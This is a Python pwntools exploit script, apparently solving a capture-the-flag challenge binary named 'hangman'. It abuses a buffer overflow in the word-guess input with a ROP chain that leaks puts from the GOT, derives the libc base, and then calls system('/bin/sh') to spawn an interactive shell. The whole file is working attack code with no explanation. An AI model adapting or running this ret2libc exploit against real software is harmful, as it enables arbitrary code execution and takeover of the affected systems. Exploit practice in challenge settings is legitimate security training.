from pwn import *
import time
#context.log_level='DEBUG'
p = process("./hangman")
elf=ELF("./hangman")
libc=elf.libc
pause()
def guessWord(payload,clean_buffer=False):
	#payload = 'A'*21
	p.sendlineafter("Enter choice: ","2")
	p.sendlineafter("Enter word: ",payload)
	if clean_buffer:
		p.sendlineafter("Enter choice: ","10")



puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
gameLoop=elf.sym['gameLoop']
log.info("PUTS GOT -> "+hex(puts_got))
def POC():
	payload = '\xff'*0x21
	guessWord(payload,clean_buffer=True)
	pop_rdi_ret = 0x00000000004019a3
	payload ='A'*0x40
	payload += p64(pop_rdi_ret)
	payload += p64(puts_got)
	payload += p64(puts_plt)
	payload += p64(gameLoop)
	guessWord(payload)
	p.recvuntil("Wrong...\n")
	leak = u64(p.recvline(keepends=False).ljust(8,'\x00'))
	log.info("LEAK -> "+hex(leak))
	libc.address = leak - libc.symbols['puts']
	log.info("LIBC ADDRESS -> "+hex(libc.address))
	system_offset = libc.symbols['system']
	log.info("SYSTEM OFFSET -> "+hex(system_offset))
	binsh_offset=libc.search("/bin/sh\x00").next()
	log.info("BINSH_OFFSET -> "+hex(binsh_offset))
	system = libc.address + system_offset
	log.info("SYSTEM -> "+hex(system))
	binsh = libc.address + binsh_offset
	log.info("BINSH -> "+hex(binsh))
	payload = '\xff'*0x21
	guessWord(payload,clean_buffer=True)
	one_gadget=0xe652b
	payload = 'A'*64
	#pause()
	#payload += p64(libc.address+one_gadget)
	payload += p64(pop_rdi_ret+1)
	payload += p64(pop_rdi_ret)
	payload += p64(binsh)
	payload += p64(0)
	payload += p64(system)
	guessWord(payload)
if __name__ == '__main__':
	POC()
	p.interactive()